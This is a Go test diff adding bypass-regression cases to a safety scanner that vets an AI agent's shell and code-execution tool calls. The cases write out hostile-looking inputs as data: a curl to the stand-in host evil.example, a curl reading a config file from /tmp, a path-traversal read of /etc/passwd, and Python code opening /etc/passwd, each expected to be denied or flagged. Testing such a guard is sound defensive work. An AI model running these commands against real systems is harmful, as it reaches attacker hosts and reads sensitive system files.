@@ -110,6 +110,41 @@ func TestScannerBypassRegressions(t *testing.T) {
 			decision: DecisionAllow,
 		},
 		{
+			name: "ftp network url denied",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "curl ftp://evil.example/file https://github.com/trpc-group/trpc-agent-go",
+			},
+			decision: DecisionDeny, rule: ruleNetworkEgress,
+		},
+		{
+			name: "curl config needs review",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "curl -K /tmp/curlrc https://github.com/trpc-group/trpc-agent-go",
+			},
+			decision: DecisionAsk, rule: ruleNetworkEgress,
+		},
+		{
+			name: "normalized denied path",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "cat /tmp/../etc/passwd",
+			},
+			decision: DecisionDeny, rule: ruleSensitivePath,
+		},
+		{
+			name: "quoted code denied path",
+			req: Request{
+				ToolName: "execute_code", Backend: BackendCodeExec,
+				CodeBlocks: []CodeBlock{{
+					Language: "python",
+					Code:     `open("/etc/passwd").read()`,
+				}},
+			},
+			decision: DecisionDeny, rule: ruleSensitivePath,
+		},
+		{
 			name: "interactive stdin chunk needs review",
 			req: Request{
 				ToolName: "workspace_write_stdin", Backend: BackendWorkspaceExec,
